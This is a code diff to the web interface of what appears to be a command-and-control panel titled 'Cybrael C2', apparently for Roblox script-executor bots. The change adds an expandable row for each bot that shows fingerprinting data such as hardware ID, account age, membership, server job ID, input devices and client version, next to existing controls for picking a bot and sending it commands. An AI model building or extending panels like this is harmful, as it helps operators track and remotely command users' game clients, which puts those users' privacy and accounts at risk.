@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cybrael C2</title>
+<title>TESTTTT</title>
 <style>
   :root {
     --bg: #0a0a0e;
@@ -139,6 +139,33 @@
     background: #1c1c26;
     color: var(--muted);
   }
+
+  .detail-row td {
+    background: #0e0e14;
+    border-bottom: 1px solid var(--border);
+    padding: 10px 8px;
+  }
+  .detail-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 6px 14px;
+    font-size: 11px;
+  }
+  @media (min-width: 900px) {
+    .detail-grid { grid-template-columns: 1fr 1fr 1fr; }
+  }
+  .detail-grid .k {
+    display: block;
+    color: var(--muted);
+    font-size: 9px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-bottom: 1px;
+  }
+  .detail-grid .v { color: var(--text); word-break: break-all; }
+  .detail-grid .mono { font-family: inherit; opacity: 0.9; }
+  button.info-btn { min-width: 24px; }
+
 </style>
 </head>
 <body>
@@ -307,16 +334,50 @@ function renderBots() {
   for (const [uid, b] of entries) {
     const age = ageLabel(b.lastseen);
     const tr = document.createElement("tr");
+    tr.className = "bot-row";
+    tr.dataset.uid = uid;
     tr.innerHTML = `
       <td><span class="status-dot ${age.cls}"></span></td>
       <td>${esc(b.name || "?")}</td>
       <td>${esc(String(b.userid || uid))}</td>
-      <td>${esc((b.executor || "?").slice(0, 12))}</td>
-      <td>${esc(String(b.gameid || "?"))}</td>
+      <td>${esc((b.executor || "?").toString().slice(0, 14))}</td>
+      <td>${esc(String(b.placeid || b.gameid || "?"))}</td>
       <td class="${age.cls}">${age.text}</td>
-      <td><button class="btn sm" data-uid="${uid}">pick</button></td>
+      <td>
+        <button class="btn sm" data-uid="${uid}">pick</button>
+        <button class="btn sm info-btn" data-info="${uid}">▾</button>
+      </td>
     `;
     botBody.appendChild(tr);
+
+    const detail = document.createElement("tr");
+    detail.className = "detail-row";
+    detail.dataset.for = uid;
+    detail.style.display = "none";
+    const inputBits = [
+      b.keyboard ? "kb" : null,
+      b.mouse ? "mouse" : null,
+      b.touch ? "touch" : null,
+      b.gamepad ? "pad" : null,
+      b.vr ? "vr" : null,
+    ].filter(Boolean).join(", ") || "?";
+    detail.innerHTML = `
+      <td colspan="7">
+        <div class="detail-grid">
+          <div><span class="k">hwid</span><span class="v mono">${esc(b.hwid || "n/a")}</span></div>
+          <div><span class="k">display</span><span class="v">${esc(b.displayname || "?")}</span></div>
+          <div><span class="k">account age</span><span class="v">${esc(String(b.accountage ?? "?"))}d</span></div>
+          <div><span class="k">membership</span><span class="v">${esc(b.membership || "?")}</span></div>
+          <div><span class="k">place</span><span class="v">${esc(b.placename || String(b.placeid || b.gameid || "?"))}</span></div>
+          <div><span class="k">jobid</span><span class="v mono">${esc((b.jobid || "").toString().slice(0, 24))}</span></div>
+          <div><span class="k">viewport</span><span class="v">${esc(b.camera || "?")}</span></div>
+          <div><span class="k">input</span><span class="v">${esc(inputBits)}</span></div>
+          <div><span class="k">client ver</span><span class="v mono">${esc(b.robloxver || "?")}</span></div>
+          <div><span class="k">executor</span><span class="v">${esc(b.executor || "?")}</span></div>
+        </div>
+      </td>
+    `;
+    botBody.appendChild(detail);
 
     const opt = document.createElement("option");
     opt.value = uid;
@@ -328,6 +389,21 @@ function renderBots() {
 
   botBody.querySelectorAll("button[data-uid]").forEach(btn => {
     btn.onclick = () => { targetSelect.value = btn.dataset.uid; cmdInput.focus(); };
+  });
+  botBody.querySelectorAll("button.info-btn").forEach(btn => {
+    btn.onclick = (e) => {
+      e.stopPropagation();
+      const uid = btn.dataset.info;
+      const row = botBody.querySelector(`tr.detail-row[data-for="${uid}"]`);
+      if (!row) return;
+      const open = row.style.display !== "none";
+      botBody.querySelectorAll("tr.detail-row").forEach(r => r.style.display = "none");
+      botBody.querySelectorAll("button.info-btn").forEach(b => b.textContent = "▾");
+      if (!open) {
+        row.style.display = "table-row";
+        btn.textContent = "▴";
+      }
+    };
   });
 }
 
